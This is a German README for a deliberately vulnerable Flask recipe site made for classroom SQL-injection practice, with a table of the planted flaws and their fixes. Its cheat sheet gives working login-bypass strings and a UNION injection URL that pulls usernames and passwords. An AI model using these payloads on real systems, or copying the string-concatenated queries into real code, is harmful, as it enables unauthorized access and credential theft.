# RezeptBox – bewusst unsichere Demo-Webseite (SQL-Injection-Übung)

Eine kleine Rezept-Community in **Python / Flask / MySQL**. Die App ist
**absichtlich unsicher** programmiert, damit Mitschüler:innen im Unterricht
**SQL-Injection** praktisch ausprobieren können. In einer späteren Phase
wird die App abgesichert.

> ⚠️ **Nur lokal im Klassennetz betreiben – niemals ins öffentliche Internet stellen.**
> Die Lücken sind echt und ausnutzbar.

> 📄 Eine vollständige Liste **aller** eingebauten Schwachstellen – inklusive
> konkreter Exploit-Befehle – steht in [`LUECKEN.md`](LUECKEN.md).

Thema und Oberfläche sind anders als beim Ticketsystem, die Schwachstellen
sind aber dieselben.

---

## 1. Schnellstart (ohne MySQL, läuft sofort)

```bash
pip install Flask
set DB_BACKEND=sqlite        # Windows (cmd)
# export DB_BACKEND=sqlite   # macOS / Linux
python app.py
```

Dann im Browser öffnen: <http://localhost:5000>

Die Datei `rezepte.db` wird automatisch mit Tabellen und Beispieldaten angelegt.
Mit `set PORT=5001` lässt sich ein anderer Port wählen (z. B. um parallel zum
Ticketsystem zu laufen).

---

## 2. Start mit MySQL

```bash
mysql -u root -p < schema.sql
pip install -r requirements.txt
set DB_BACKEND=mysql
set DB_HOST=127.0.0.1
set DB_USER=root
set DB_PASSWORD=deinPasswort
set DB_NAME=rezeptbox
python app.py
```

---

## 3. Vorhandene Test-Accounts

| Benutzername | Passwort        |
|--------------|-----------------|
| admin        | KuechenChef2024 |
| mia          | pommes123       |
| ben          | nudelsalat      |

---

## 4. Cheat-Sheet für die Tester:innen (SQL Injection)

Nach jedem fehlgeschlagenen Login zeigt die Seite das tatsächlich ausgeführte
SQL an (Lernhinweis).

**a) Login-Bypass (ohne Passwort einloggen)**

Feld *Benutzername*:
```
admin' --
```
Feld *Passwort*: beliebig (z. B. `x`)

Oder im Passwortfeld:
```
' OR '1'='1
```

**b) Warum es funktioniert**

Der Code baut die Abfrage so zusammen:
```sql
SELECT * FROM users WHERE username = '<EINGABE>' AND password = '<EINGABE>'
```
Mit `admin' --` wird daraus:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```
Der Teil nach `--` ist auskommentiert → die Passwortprüfung entfällt.

**c) Daten auslesen über die Rezept-URL (UNION-Injection)**

Die Rezept-Ansicht (`/rezept/<id>`) setzt die ID ungeprüft ein:
```
/rezept/0 UNION SELECT 1, username, password, 4, 5 FROM users
```
→ zeigt Benutzername + Passwort eines Kontos in der Rezept-Detailansicht an.

---

## 5. Wo stecken die Lücken im Code? (für die Absicherungs-Phase)

Alle Stellen stehen in `app.py` und sind mit `!!! BEWUSST UNSICHER !!!` markiert:

| Ort                     | Problem                                   | Spätere Lösung                        |
|-------------------------|-------------------------------------------|---------------------------------------|
| `login()`               | String-Verkettung in der SELECT-Abfrage   | Parametrisierte Query (`%s` / `?`)    |
| `register()`            | String-Verkettung im INSERT               | Parametrisierte Query                 |
| `rezept()`              | ID direkt in die Query eingesetzt         | Parametrisierte Query + ID als `int`  |
| Passwörter im Klartext  | Keine Verschlüsselung                      | Hashing (z. B. `werkzeug` / bcrypt)   |
| SQL-Fehler werden angezeigt | Erleichtert Angriff                   | Fehler abfangen, nichts verraten      |

---

## 6. Projektstruktur

```
rezeptbox/
├── app.py              # Flask-App (enthält die bewussten Lücken)
├── schema.sql          # MySQL-Schema + Beispieldaten
├── requirements.txt
├── README.md
├── static/
│   └── style.css
└── templates/
    ├── login.html
    ├── register.html
    ├── dashboard.html
    ├── rezept.html
    └── new_rezept.html
```
